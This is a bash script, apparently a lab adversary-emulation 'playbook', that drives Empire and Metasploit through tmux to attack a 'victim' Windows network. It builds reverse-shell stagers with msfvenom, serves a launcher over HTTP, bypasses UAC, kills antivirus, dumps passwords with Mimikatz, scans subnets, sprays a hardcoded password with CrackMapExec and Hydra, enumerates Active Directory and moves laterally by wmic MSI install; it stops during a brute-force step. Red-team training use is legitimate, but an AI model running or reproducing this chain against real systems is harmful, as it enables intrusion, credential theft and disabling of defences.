#!/bin/bash

# Set our TMUX Variables
window=${session}:0
CONTROL=${window}.0
MSF=${window}.2
EMPIRE=${window}.1


VERSION="PB001-2021.11-001"
# changelog
# - PB001-2021.09.07.001: Replace psexec lateral movement with wmic.
# - PB001-2021.09.12.001: Fix OS version with Empire. Remove CME window.
# - PB001-2021.11-001: Compatible with Kali 2021.3 upgrade.
# - PB001-2021.11-001: python3 is now default
# - PB001-2021.11-001: ps-empire updated to version 4.0

printf "\n\n"
read -p "Script Version is $VERSION ... press enter when ready to continue"

profile() {
# Determine operating profile
printf "\n\n"
while :
do
        clear
        cat<<EOF
        ==============================
        Playbook Modes
        ------------------------------
        Please enter your choice:

        (1) Manual
        (2) Interactive
        (3) Auto Pilot
        ------------------------------
EOF
        read -n1 -s
        case "$REPLY" in
        "1")  exit                   ;;
        "2")  MODE="interactive"     ;;
        "3")  MODE="auto"            ;;
        * )  echo "invalid option"   ;;
        esac
        sleep 1
        break
done
}

warning() {
cat << EOF


    IMPORTANT                   IMPORTANT                        IMPORTANT

    When running this playbook it's absolutely crucial that you are HANDS OFF.
    In order for the playbook to work properly the correct window pane must be
    in focus at the right time.  So while it's running you cannot be clicking
    on any other screens/panes.

    Once a command starts running, it's critical that you allow it to finish
    before running the next command.  The only safe time to switch window
    panes is in interactive mode, after a command completes.  You can use that
    time to switch panes and review output (scroll up/down) and then return
    to your control pane and 'press enter when ready'.

EOF
read -p "... press enter when ready to continue"
}

initiate_environment() {

    # Commentary
    tmux select-pane
    tmux select-pane -t $CONTROL
    clear
    sleep 2s
    printf "\n\n"
    printf "Playbook Version: $VERSION\n\n"
    printf "\nIf this is a subsequent run, did you remember to reboot your victi                                                                                        m machine?\n\n"
    printf "\nFirst we need to get some information from you on the environment.                                                                                        \n"
    printf "You should have received the details needed from your Lab Welcome le                                                                                        tter.\n\n"

    # Set Victim Variables - Retrieve User Input
    read -p 'Victim Name: ' VICNAME
    read -p 'Victim IP  : ' VICIP
    read -s -p 'Kali Password: ' KALIPASS

    # Set Attacker Variables - Automated
    KALI=$(hostname -I)
    KALI_IP="$(echo -e "${KALI}" | tr -d '[:space:]')"
    LAB=`echo $KALI | cut -d . -f 2`

    # Start Empire
    printf "\n\nEmpire - Starting server..."
    tmux send-keys -t EMPIRE-SERVER "cd /home/kali/lab/apps/Empire" Enter
    tmux send-keys -t EMPIRE-SERVER "./ps-empire server" Enter
    sleep 35s

    #Start ps-empire client
    printf "\n\nEmpire - Starting Empire client..."
    tmux select-pane -t $EMPIRE
    tmux send-keys "cd /home/kali/lab/apps/Empire" Enter
    tmux send-keys "./ps-empire client" Enter
    sleep 15s

    #Start ps-empire client
    printf "\n\nEmpire - Loading csharpserver plugin..."
    tmux send-keys "useplugin csharpserver" Enter
    sleep 5s


    # Configure a new listener
    printf "\nEmpire - Configuring listener ..."
    tmux send-key "listeners" Enter
    tmux send-key "uselistener http" Enter
    tmux send-key "set Host $KALI_IP" Enter
    tmux send-key "set Port 80" Enter
    tmux send-key "execute" Enter
    sleep 2s

    # Configure a new stager
    printf "\nEmpire - Creating stager..."
    tmux send-keys "back" Enter
    #tmux send-keys "usestager windows/nim" Enter
    tmux send-keys "usestager windows/launcher_bat" Enter
    tmux send-keys "set Listener http" Enter
    tmux send-keys "set OutFile http_launcher.bat" Enter
    tmux send-keys "set Delete False" Enter
    tmux send-keys "execute" Enter
    sleep 3s

    # Start HTTP Server
    printf "\nHTTPServer - Starting in a background session..."
    tmux send-keys -t HTTPSERVER "cd /home/kali/lab/stagers" Enter
    tmux send-keys -t HTTPSERVER "cp /home/kali/lab/apps/Empire/empire/client/ge                                                                                        nerated-stagers/http_launcher.bat /home/kali/lab/stagers/" Enter
    tmux send-keys -t HTTPSERVER "python3 -m http.server 8080" Enter
    tmux send-keys -t HTTPSERVER Enter

    # Start Metasploit
    # create EXE msf reverse_https stager if not exist
    FILE=/home/kali/lab/stagers/https_backdoor.exe
    if [ ! -f "$FILE" ]; then
        printf "Creating EXE meterpreter reverse_https stager..\n"
        msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_ht                                                                                        tps LHOST=$KALI_IP LPORT=443 -f exe -o /home/kali/lab/stagers/https_backdoor.exe
    fi
        # create MSI msf reverse_https stager if not exist
    FILE_MSI=/home/kali/lab/stagers/rev.msi
    if [ ! -f "$FILE_MSI" ]; then
        printf "Creating MSI meterpreter reverse_https stager..\n"
                msfvenom -a x64 --platform windows -p windows/x64/meterpreter/re                                                                                        verse_https lhost=$KALI_IP lport=443 -f MSI -o /home/kali/lab/stagers/rev.msi
    fi
    # initialize metasploit
    printf "\nMetasploit - Initializing ..."
    tmux select-pane -t $MSF
    tmux send-keys "sudo service postgresql start" Enter
    tmux send-keys "sudo msfdb init" Enter
    tmux send-keys "msfconsole" Enter
    sleep 30s
    # configure metasploit for playbook
    tmux send-keys "use auxiliary/server/socks_proxy" Enter
    tmux send-keys "set VERSION 4a" Enter
    tmux send-keys "exploit -j" Enter
    tmux send-keys "use exploit/multi/handler" Enter
    tmux send-keys "set payload windows/x64/meterpreter/reverse_https" Enter
    tmux send-keys "set LPORT 443" Enter
    tmux send-keys "set LHOST $KALI_IP" Enter
    tmux send-keys "set ExitonSession False" Enter
    tmux send-keys "exploit -j" Enter
    sleep 10s
}

initiate_initial_compromise() {

    # WAIT FOR OPERATOR TO INITIATE INITIAL COMPROMISE
cat << EOF



    STOP                      STOP                       STOP

    At this point you need to RDP into your victim machine to initiate
    the initial compromise.  On your victim open Chrome and browse to the
    following location to download the launcher.  For whatever reason there
    is a long delay after you enter the URL unless you press enter twice
    on the url.  Launching the file directly from the browser takes time as
    well so we recommend that you open file explorer and go to your downloads
    directory and launch the file from there.  If you are presented with any
    kind of 'SmartScreen' error just select 'more info' and run anyway.

    Do NOT run the launcher using 'run as administrator'!

    COPY/PASTE IN TMUX DOES NOT WORK - Don't even attempt it.
    Type the following url into Chrome manually pretty please.


EOF
    printf "    http://$KALI_IP:8080/http_launcher.bat\n\n"
    tmux select-pane -t $CONTROL && read -p "    Come back here and press enter                                                                                         after running the launcher:"
    AGENT=$(tmux capture-pane -pS -20 -t $window.1 | grep "New agent" | cut -d "                                                                                         " -f 4)
    if [ -z "$AGENT" ]
    then
        sleep 30s
        AGENT=$(tmux capture-pane -pS -20 -t $window.1 | grep "New agent" | cut                                                                                         -d " " -f 4)
    fi
    printf "\n\nEmpire - Retrieving session details ... $AGENT"

    # Interact with new session
    tmux select-pane -t $EMPIRE
    tmux send-keys "agents" Enter
    tmux send-keys "list" Enter
    tmux send-keys "interact $AGENT" Enter

    # Bypassuac
    tmux send-keys "usemodule powershell/privesc/bypassuac_env" Enter
    tmux send-keys "set Listener http" Enter
    tmux send-keys "execute"  Enter
    #tmux send-keys "y"  Enter | sleep 10s
    tmux send-keys "back" Enter | sleep 5s
    tmux send-keys "back" Enter | sleep 3s
    tmux send-keys "back" Enter

    # Interact with High Integrity session
    PRIVAGENT=""
    PRIVAGENT=$(tmux capture-pane -pS -10 -t $window.1 | grep "New agent" | cut                                                                                         -d " " -f 4)

    printf "\n\nThis is the agent: $PRIVAGENT \n\n"
    #read -p "Press any key to continue"

    if [ -z "$PRIVAGENT" ]
    then
        sleep 30s
        PRIVAGENT=$(tmux capture-pane -pS -20 -t $window.1 | grep "New agent" |                                                                                         cut -d " " -f 4)
        if [ -z "$PRIVAGENT" ]
        then
            tmux select-pane -t $CONTROL && read -p "Something has gone horribly                                                                                         wrong and you will need to start all over."
            exit
        fi
    fi

    printf "\n\nEmpire - Retrieving session details  ... $PRIVAGENT"
    printf "\n\nEmpire - Interacting with elevated session ..."
    tmux select-pane -t $EMPIRE
    tmux send-keys "agents" Enter
    tmux send-keys "list" Enter
    tmux send-keys "interact $PRIVAGENT" Enter
    tmux send-keys Enter | sleep 5s

    # Upload and Launch Secondary Control channel
    printf "\nEmpire - Uploading and launching secondary backdoor ..."
    tmux send-keys "shell 'cd c:\users\public'" Enter
    tmux send-keys "upload /home/kali/lab/stagers/https_backdoor.exe" Enter | sl                                                                                        eep 10s
    tmux send-keys "shell 'start c:\users\public\https_backdoor.exe'" Enter | sl                                                                                        eep 10s

    # Waiting for metepreter
    MSFS=$(tmux capture-pane -pS -20 -t $window.2 | grep "] Meterpreter session"                                                                                         | tail -n 1 | cut -d " " -f 4)
    if [ -z "$MSFS" ]
    then
        sleep 30s
        MSFS=$(tmux capture-pane -pS -20 -t $window.2 | grep "] Meterpreter sess                                                                                        ion" | tail -n 1 | cut -d " " -f 4)
    fi
    printf "\nMeterpreter - Retrieving session details ... $MSFS"

    # Interact with Meterpreter
    printf "\nMeterpreter - Interacting with session and elevating system ..."
    tmux select-pane -t $MSF
    tmux send-keys Enter
    tmux send-keys "sessions -i $MSFS" Enter
    tmux send-keys Enter | sleep 5s
    tmux send-keys "getsystem" Enter | sleep 7s

    # Upload additional tools
    printf "\nMeterpreter - Uploading additional tools ..."
    tmux select-pane -t $MSF
    tmux send-keys "cd c:\\\\users\\\\public" Enter | sleep 3s
        tmux send-keys "upload /home/kali/lab/stagers/rev.msi" Enter | sleep 2s
    tmux send-keys "rmdir c:\\\\users\\\\public\\\\tools" Enter | sleep 3s
    tmux send-keys "upload /home/kali/lab/toolbox/SharpHound.exe" Enter | sleep                                                                                         2s
    tmux send-keys "upload /home/kali/lab/toolbox/pscp.exe" Enter | sleep 2s
    tmux send-keys "upload /home/kali/lab/toolbox/7za.exe" Enter | sleep 2s
    tmux send-keys "upload /home/kali/lab/toolbox/tools.tar.gz" Enter | sleep 35                                                                                        s

    # Unpacking tools on victim
    printf "\nMeterpreter - Unpacking tools on victim ..."
    tmux send-keys "shell" Enter | sleep 12s
    tmux send-keys "cd c:\users\public" Enter | sleep 2s
    tmux send-keys "del tools.tar" Enter | sleep 2s
    tmux send-keys "7za.exe e tools.tar.gz && 7za.exe x tools.tar" Enter | sleep                                                                                         15s
    tmux send-keys "exit" Enter | sleep 15s

}
interactive() {
    if [ "$MODE" = "interactive" ]
    then
        tmux select-pane -t $CONTROL && read -p " press enter when ready to laun                                                                                        ch next attack ..."
    fi
}

attack() {

    clear
    if [ "$MODE" = "interactive" ]
    then
        tmux select-pane -t $CONTROL && printf "\n\n\n" && read -p "***** We are                                                                                         about to start the attack sequence ... press enter when ready"
    else
        printf "\n\n\n***** Attack sequence is starting ... sit back and relax w                                                                                        hile I do all the work for you :-) ...\n"
    fi
    START=$(date)
    printf "\nStart: $(date)\n"


   ##################################### LOCAL FOCUS ###########################                                                                                        ###################


    # Dump System Info
    printf "\nEMPIRE - Dumping victim system info ... 10s ..."
    tmux select-pane -t $EMPIRE
    tmux send-keys Enter
    tmux send-keys "display os_details" Enter | sleep 10s
    interactive

    # Grab OS Build Number
    OSVER=$(tmux capture-pane -pS -50 -t $window.1 | grep "os_details" | tail -n                                                                                         1)
    printf "\nTarget OS Version: $OSVER \n\n"

    # Dump User and Group Info
    printf "\nMSF - Dumping victim user and group info ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "shell" Enter | sleep 5s
    tmux send-keys "whoami /all" Enter | sleep 10s
    interactive

    # Dump Local Account List
    printf "\nMSF - Dumping victim local account list ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "net user" Enter | sleep 10s
    interactive

    # Dump Local Admin Group Members
    printf "\nMSF - Dumping victim local administrators group members ... 10s ..                                                                                        ."
    tmux select-pane -t $MSF
    tmux send-keys "net localgroup Administrators" Enter | sleep 10s
    interactive

    # Dump victim IP
    printf "\nMSF - Dumping victim IP details ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "ipconfig /all" Enter | sleep 10s
    interactive

    # Dump victim Routing
    printf "\nMSF - Dumping victim routing details ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "netstat -nr" Enter | sleep 10s
    interactive

    # Dump victim Firewall Profile
    printf "\nMSF - Dumping victim firewall profile ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "netsh advfirewall show allprofiles" Enter | sleep 10s
    interactive

    # Dump security patches
    printf "\nMSF - Dumping victim security patches ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "wmic qfe get Caption,Description,HotFixID,InstalledOn" Enter                                                                                         | sleep 10s
    interactive

    # Dump victim antivirus details
    printf "\nMSF - Dumping victim antivirus profile ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "powershell Get-CimInstance -Namespace root/SecurityCenter2 -                                                                                        ClassName AntivirusProduct" Enter | sleep 10s
    tmux send-keys "exit" Enter | sleep 5s
    tmux send-keys "bg" Enter | sleep 3s
    interactive

    # Collect Details on Victim using MSF
    printf "\nMSF - Retrieving victim ENV details ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "use post/multi/gather/env" Enter
    tmux send-keys "set SESSION $MSFS" Enter
    tmux send-keys "exploit" Enter | sleep 10s
    interactive

    # Collect Network Details on Victim
    printf "\nMSF - Retrieving victim network details ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "use post/windows/gather/tcpnetstat" Enter
    tmux send-keys "set SESSION $MSFS" Enter
    tmux send-keys "exploit" Enter | sleep 10s
    interactive

    # Kill Victim Anti Virus
    printf "\nMSF - Killing victim A/V ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "use post/windows/manage/killav" Enter
    tmux send-keys "set SESSION $MSFS" Enter
    tmux send-keys "exploit" Enter | sleep 10s
    interactive

    # Find Who's Currently Logged On
    printf "\nMSF - Determing who's currently logged onto victim ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "use post/windows/gather/enum_logged_on_users" Enter
    tmux send-keys "set SESSION $MSFS" Enter
    tmux send-keys "exploit" Enter | sleep 10s
    interactive

    # Publish Running Services
    printf "\nMSF - Listing victim's running services ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "use post/windows/gather/enum_services" Enter
    tmux send-keys "set SESSION $MSFS" Enter
    tmux send-keys "exploit" Enter | sleep 10s
    interactive "10s"

    ## This section is failing so we need to skip it for now ....
    ## Interrogate for Local Exploits
    #printf "\nMSF - Running exploit suggester on victim ... 60s ..."
    #tmux select-pane -t $MSF
    #tmux send-keys "use post/multi/recon/local_exploit_suggester" Enter
    #tmux send-keys "set SESSION $MSFS" Enter
    #tmux send-keys "exploit" Enter | sleep 60s
    #interactive

    # Dump Passwords Using Mimikatz
    printf "\nMSF - Running Mimikatz on victim ... 60s ..."
    tmux select-pane -t $MSF
    tmux send-keys "sessions -i $MSFS" Enter | sleep 2s
    tmux send-keys "shell" Enter | sleep 12s
    tmux send-keys "cd c:\users\public\tools" Enter | sleep 4s
    tmux send-keys "mimikatz.exe" Enter | sleep 3s
    tmux send-keys "privilege::debug" Enter | sleep 3s
    tmux send-keys "misc::memssp" Enter | sleep 3s
    tmux send-keys "sekurlsa::logonpasswords" Enter | sleep 10s
    tmux send-keys "exit" Enter | sleep 6s
    tmux send-keys "exit" Enter | sleep 6s
    tmux send-keys "bg" Enter | sleep 3s
    interactive

    ##################################### NETWORK FOCUS ########################                                                                                        ######################


    # Create User Zone Route
    printf "\nMSF - Creating user zone routes ... 7s ..."
    tmux select-pane -t $MSF
    tmux send-keys "use post/multi/manage/autoroute" Enter
    tmux send-keys "set CMD add" Enter
    tmux send-keys "set SESSION $MSFS" Enter
    tmux send-keys "set SUBNET 10.$LAB.50.0" Enter
    tmux send-keys "set NETMASK 255.255.255.0" Enter
    tmux send-keys "exploit" Enter | sleep 7s
    interactive

    # Create Server Zone Routing Script
    printf "\nMSF - Creating server zone routes ... 7s ..."
    tmux select-pane -t $MSF
    tmux send-keys "use post/multi/manage/autoroute" Enter
    tmux send-keys "set CMD add" Enter
    tmux send-keys "set SESSION $MSFS" Enter
    tmux send-keys "set SUBNET 10.$LAB.100.0" Enter
    tmux send-keys "set NETMASK 255.255.255.0" Enter
    tmux send-keys "exploit" Enter | sleep 7s
    interactive

    # Find Domain Controller
    printf "\nMSF - Finding the domain controller ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "use post/windows/gather/enum_domain" Enter
    tmux send-keys "set SESSION $MSFS" Enter
    tmux send-keys "exploit" Enter | sleep 10s
    interactive

    # Create Workstation Portscan Script
    printf "\nMSF - Searching for machines in the user subnet ... 45s ..."
    tmux select-pane -t $MSF
    tmux send-keys "use auxiliary/scanner/portscan/tcp" Enter
    tmux send-keys "set PORTS 445" Enter
    tmux send-keys "set RHOSTS 10.$LAB.50.0/24" Enter
    tmux send-keys "set THREADS 300" Enter
    tmux send-keys "set CONCURRENCY 40" Enter
    tmux send-keys "set TIMEOUT 100" Enter
    tmux send-keys "exploit" Enter | sleep 45s
    interactive


    ##################################### SERVER FOCUS #########################                                                                                        #####################


    # Create Server Portscan Script
    printf "\nMSF - Searching for machines in the server subnet ... 45s ..."
    tmux select-pane -t $MSF
    tmux send-keys "use auxiliary/scanner/portscan/tcp" Enter
    tmux send-keys "set PORTS 445" Enter
    tmux send-keys "set RHOSTS 10.$LAB.100.0/24" Enter
    tmux send-keys "set THREADS 300" Enter
    tmux send-keys "set CONCURRENCY 40" Enter
    tmux send-keys "set TIMEOUT 100" Enter
    tmux send-keys "exploit" Enter | sleep 45s
    interactive

    # Create Server Deepscan Script
    printf "\nMSF - Deep scanning the application servers ... 5 minutes ..."
    tmux select-pane -t $MSF
    tmux send-keys "use auxiliary/scanner/portscan/tcp" Enter
    tmux send-keys "set PORTS 1-1024, 1433, 3389" Enter
    tmux send-keys "set RHOSTS 10.$LAB.100.62, 10.$LAB.100.99" Enter
    tmux send-keys "set THREADS 300" Enter
    tmux send-keys "set CONCURRENCY 40" Enter
    tmux send-keys "set TIMEOUT 100" Enter
    tmux send-keys "exploit -j" Enter | sleep 300s
    interactive

    # Test local admin on servers
    printf "\nMSF - Testing local admin on servers ... 60s ..."
    tmux select-pane -t $MSF
    tmux send-keys "sessions -i $MSFS" Enter | sleep 2s
    tmux send-keys "shell" Enter | sleep 12s
    tmux send-keys "cd c:\users\public\tools" Enter | sleep 4s
    tmux send-keys "cme.exe -u administrator  -p Ednott11! -d \" \" 10.$LAB.100.                                                                                        1-100" Enter | sleep 45s
    interactive

    # Test Common Account Access to Servers
    printf "\nMSF - Testing common default accounts on servers ... 30s ..."
    tmux select-pane -t $MSF
    tmux send-keys "cme.exe -u win_users.txt -p Ednott11! -d archer 10.$LAB.100.                                                                                        1-100" Enter | sleep 30s
    interactive

    # Test RDP Access to the servers
    printf "\nMSF - Testing common RDP accounts on servers ... 45s ..."
    tmux select-pane -t $MSF
    tmux send-keys "hydra.exe -t 1 -V -f -L rdp_users.txt -P rdp_pass.txt rdp://                                                                                        10.$LAB.100.32" Enter | sleep 15s
    tmux send-keys "hydra.exe -t 1 -V -f -L rdp_users.txt -P rdp_pass.txt rdp://                                                                                        10.$LAB.100.62" Enter | sleep 15s
    tmux send-keys "hydra.exe -t 1 -V -f -L rdp_users.txt -P rdp_pass.txt rdp://                                                                                        10.$LAB.100.99" Enter | sleep 15s
    tmux send-keys "exit" Enter | sleep 12s
    tmux send-keys "bg" Enter | sleep 3s
    interactive

    # Create SQL Injection Test Script
    printf "\nMSF - Attempting to SQL Inject servers ... 35s ..."
    tmux select-pane -t $MSF
    tmux send-keys "use auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli" E                                                                                        nter
    tmux send-keys "set GET_PATH  /testing.asp?id=1+and+1=[SQLi];--" Enter
    tmux send-keys "set RHOSTS 10.$LAB.100.32, 10.$LAB.100.62, 10.$LAB.100.99" E                                                                                        nter
    tmux send-keys "exploit" Enter | sleep 35s
    interactive

    # Dump Domain Users
    printf "\nMSF - Dumping list of AD Users ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "use post/windows/gather/enum_ad_users" Enter
    tmux send-keys "set DOMAIN archer.Local" Enter
    tmux send-keys "set SESSION $MSFS" Enter
    tmux send-keys "set FILTER (&(objectCategory=person)(objectClass=user))" Ent                                                                                        er
    tmux send-keys "exploit" Enter | sleep 10s
    interactive

    # Dump Administrative Domain Users
    printf "\nMSF - Dumping list of Administrative AD Users ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "use post/windows/gather/enum_ad_users" Enter
    tmux send-keys "set DOMAIN archer.Local" Enter
    tmux send-keys "set SESSION $MSFS" Enter
    tmux send-keys "set FILTER (&(objectCategory=person)(objectClass=user)(&(sam                                                                                        AccountType=805306368)(admincount=1)))" Enter
    tmux send-keys "exploit" Enter | sleep 10s
    interactive

    # Dump Domain Computers
    printf "\nMSF - Dumping list of Domain Computers ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "use post/windows/gather/enum_ad_computers" Enter
    tmux send-keys "set DOMAIN archer.Local" Enter
    tmux send-keys "set SESSION $MSFS" Enter
    tmux send-keys "set FILTER (&(objectCategory=computer))" Enter
    tmux send-keys "exploit" Enter | sleep 10s
    interactive

    # Dump Domain Groups
    printf "\nMSF - Dumping list of Domain Groups ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "use post/windows/gather/enum_ad_groups" Enter
    tmux send-keys "set DOMAIN archer.Local" Enter
    tmux send-keys "set SESSION $MSFS" Enter
    tmux send-keys "set FILTER (&(objectClass=group))" Enter
    tmux send-keys "exploit" Enter | sleep 10s
    interactive

    # Dump Domain Admin Groups
    printf "\nMSF - Dumping list of Domain Admin-Level Groups ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "use post/windows/gather/enum_ad_groups" Enter
    tmux send-keys "set DOMAIN archer.Local" Enter
    tmux send-keys "set SESSION $MSFS" Enter
    tmux send-keys "set FILTER (&(objectCategory=group)(admincount=1))" Enter
    tmux send-keys "exploit" Enter | sleep 10s
    interactive


    ##################################### WORKSTATION GENERAL FOCUS ############                                                                                        ##################################


    # Test Local Administrator on all Workstations
    printf "\nMSF - Testing local admin password on all workstations ... 40s ...                                                                                        "
    tmux select-pane -t $MSF
    tmux send-keys "sessions -i $MSFS" Enter | sleep 2s
    tmux send-keys "shell" Enter | sleep 12s
    tmux send-keys "cd c:\users\public\tools" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.34-44"                                                                                         Enter | sleep 30s
    interactive

    # Dump Workstation Local Accounts
    printf "\nMSF - Dumping local accounts on workstations ... 45s ..."
    tmux select-pane -t $MSF
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.34 --u                                                                                        sers" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.35 --u                                                                                        sers" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.36 --u                                                                                        sers" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.37 --u                                                                                        sers" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.38 --u                                                                                        sers" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.39 --u                                                                                        sers" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.40 --u                                                                                        sers" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.41 --u                                                                                        sers" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.42 --u                                                                                        sers" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.43 --u                                                                                        sers" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.44 --u                                                                                        sers" Enter | sleep 6s
    interactive

    # Dump Workstation Domain Accounts
    printf "\nMSF - Dumping domain accounts on workstations ... 45s ..."
    tmux select-pane -t $MSF
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.34 --l                                                                                        users" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.35 --l                                                                                        users" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.36 --l                                                                                        users" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.37 --l                                                                                        users" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.38 --l                                                                                        users" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.39 --l                                                                                        users" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.40 --l                                                                                        users" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.41 --l                                                                                        users" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.42 --l                                                                                        users" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.43 --l                                                                                        users" Enter | sleep 4s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.44 --l                                                                                        users" Enter | sleep 6s
    interactive

    # Dump Workstation Shares
    printf "\nMSF - Dumping workstation shares ... 60s ..."
    tmux select-pane -t $MSF
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.34 --s                                                                                        hares" Enter | sleep 5s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.35 --s                                                                                        hares" Enter | sleep 5s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.36 --s                                                                                        hares" Enter | sleep 5s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.37 --s                                                                                        hares" Enter | sleep 5s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.38 --s                                                                                        hares" Enter | sleep 5s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.39 --s                                                                                        hares" Enter | sleep 5s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.40 --s                                                                                        hares" Enter | sleep 5s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.41 --s                                                                                        hares" Enter | sleep 5s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.42 --s                                                                                        hares" Enter | sleep 5s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.43 --s                                                                                        hares" Enter | sleep 5s
    tmux send-keys "cme -u administrator -p Ednott11! -d \" \" 10.$LAB.50.44 --s                                                                                        hares" Enter | sleep 5s
    interactive

    # Run SharpHound
    printf "\nMSF - Running SharpHound on victim and downloading output ... 215s                                                                                         ..."
    tmux select-pane -t $MSF
    tmux send-keys "c:\users\public\SharpHound.exe --SkipPing" Enter | sleep 180                                                                                        s
    tmux send-keys "exit" Enter | sleep 15s
    tmux send-keys "cd c:\\\\users\\\\public\\\\tools" Enter | sleep 3s
    tmux send-keys "download *_Bloodhound.zip /home/kali/lab/playbooks/pb001" En                                                                                        ter | sleep 15s
    #tmux send-keys "bg" Enter | sleep 3s
    interactive


    ##################################### TARGET FOCUS #########################                                                                                        #####################


    # Lateral Move to LKANE
    printf "\nMSF - Trying to move laterally to LKANE ... 60s ..."
    tmux select-pane -t $MSF
        tmux send-keys "shell" Enter | sleep 12s
        tmux send-keys "net use \\\\10.$LAB.50.42\c$ /user:administrator Ednott1                                                                                        1!" Enter | sleep 3s
        tmux send-keys "copy C:\Users\public\rev.msi \\\\10.$LAB.50.42\c$\PerfLo                                                                                        gs\setup.msi /Y" Enter | sleep 3s
        tmux send-keys "wmic /node:10.$LAB.50.42 /user:lkane\administrator /pass                                                                                        word:Ednott11! product call install PackageLocation=c:\PerfLogs\setup.msi" Enter                                                                                         | sleep 15s
        tmux send-keys "exit" Enter | sleep 15s
        tmux send-keys "bg" Enter | sleep 5s
    interactive

    #Need to add a check here for session 2
    #or else we need to retry because we need this to continue

        # Waiting for new metepreter session
    MSFSBIS=$(tmux capture-pane -pS -20 -t $window.2 | grep "] Meterpreter sessi                                                                                        on" | tail -n 1 | cut -d " " -f 4)
    if [ -z "$MSFSBIS" ]
    then
        sleep 30s
        MSFSBIS=$(tmux capture-pane -pS -20 -t $window.2 | grep "] Meterpreter s                                                                                        ession" | tail -n 1 | cut -d " " -f 4)
                if [ -z "$MSFSBIS" ]
                then
                         tmux select-pane -t $CONTROL && read -p "\nSTOP! Someth                                                                                        ing went wrong. No new session created."
                fi
    fi
    printf "\nMeterpreter - Retrieving session details ... $MSFS"

    # Review lkane-admin directory content
    printf "\nMSF - Reviewing lkane-admin directory content ... 30s ..."
    tmux select-pane -t $MSFSBIS
        tmux send-keys "sessions -i 2" Enter | sleep 5s
    tmux send-keys "shell" Enter | sleep 12s
        tmux send-keys "del c:\PerfLogs\setup.msi" Enter | sleep 10s
    tmux send-keys "cd c:\users\lkane-admin" Enter | sleep 4s
    tmux send-keys "dir" Enter | sleep 2s
    tmux send-keys "type passwords.txt" Enter | sleep 2s
    tmux send-keys "net share lkane-admin" Enter | sleep 3s
    tmux send-keys "exit" Enter | sleep 15s
    tmux send-keys "bg" Enter | sleep 3s
    interactive

    # Brute Force LKANE
    printf "\nMSF - Brute forcing lkane-admin ... 60s ..."
    tmux select-pane -t $MSF
    tmux send-keys "sessions -i $MSFS" Enter | sleep 2s
    tmux send-keys "shell" Enter | sleep 12s
    tmux send-keys "cd c:\users\public\tools" Enter | sleep 4s
    tmux send-keys "cme -u lkane-admin -p passwords.txt -d \" \" 10.$LAB.50.42"                                                                                         Enter | sleep 60s
    interactive

